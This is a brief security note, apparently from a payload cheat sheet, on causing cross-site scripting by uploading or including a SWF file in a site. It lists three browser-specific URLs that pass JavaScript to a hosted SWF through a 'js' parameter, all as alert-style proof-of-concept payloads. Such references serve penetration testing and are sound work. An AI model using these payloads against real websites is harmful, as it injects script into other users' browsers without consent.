### XSS via SWF

As you may already know, it is possible to make a website vulnerable to XSS if you can upload/include a SWF file into that website. I am going to represent this SWF file that you can use in your PoCs.
This method is based on [1] and [2], and it has been tested in Google Chrome, Mozilla Firefox, IE9/8; there should not be any problem with other browsers either.

```powershell
Browsers other than IE: http://0me.me/demo/xss/xssproject.swf?js=alert(document.domain);

IE8: http://0me.me/demo/xss/xssproject.swf?js=try{alert(document.domain)}catch(e){ window.open(‘?js=history.go(-1)’,’_self’);}

IE9: http://0me.me/demo/xss/xssproject.swf?js=w=window.open(‘invalidfileinvalidfileinvalidfile’,’target’);setTimeout(‘alert(w.document.location);w.close();’,1);
```